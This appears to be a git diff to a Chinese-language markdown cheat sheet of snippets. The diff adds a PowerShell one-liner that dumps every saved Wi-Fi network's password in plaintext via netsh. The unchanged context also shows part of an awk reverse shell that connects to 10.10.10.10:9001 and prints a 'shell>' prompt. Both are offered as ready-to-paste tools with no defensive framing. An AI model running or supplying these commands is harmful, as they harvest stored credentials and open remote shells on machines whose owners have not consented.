@@ -31,6 +31,8 @@ instruction
   * [freebuf2pdf](#freebuf2pdf)
   * [csdn2pdf](#csdn2pdf)
   * [wechat2pdf](#wechat2pdf)
+* [WIFI](#wifi)
+  * [powershell获取密码](#powershell获取密码)
 
 <!-- 列表头 -->
 ## Rust
@@ -113,4 +115,12 @@ awk 'BEGIN {s = "/inet/tcp/0/10.10.10.10/9001"; while(42) { do{ printf "shell>" 
 window.print();
 ```
 ---
+## WIFI
+### powershell获取密码
+> ***2024-7-1: fb0sh***
+
+> 请放入powershell里
+```powershell
+$language=(Get-Culture).Name;if($language -eq "zh-CN"){$profileRegex="\s所有用户配置文件\s*:\s*(.*)$";$keyContentRegex="关键内容\s*:\s*(.*)$"}else{$profileRegex="\sAll User Profile\s*:\s*(.*)$";$keyContentRegex="Key Content\s*:\s*(.*)$"};$results=@();$profiles=netsh wlan show profiles|Select-String $profileRegex|ForEach-Object {$_.Matches[0].Groups[1].Value.Trim()};foreach($profile in $profiles){$profileInfo=netsh wlan show profile name="$profile" key=clear;$passwordMatch=$profileInfo|Select-String $keyContentRegex;$password=if($passwordMatch){$passwordMatch.Matches[0].Groups[1].Value.Trim()}else{"No Password Found"};$results+=[PSCustomObject]@{SSID=$profile;Password=$password}};$results|Format-Table -AutoSize
+```
 <!-- 列表尾 -->
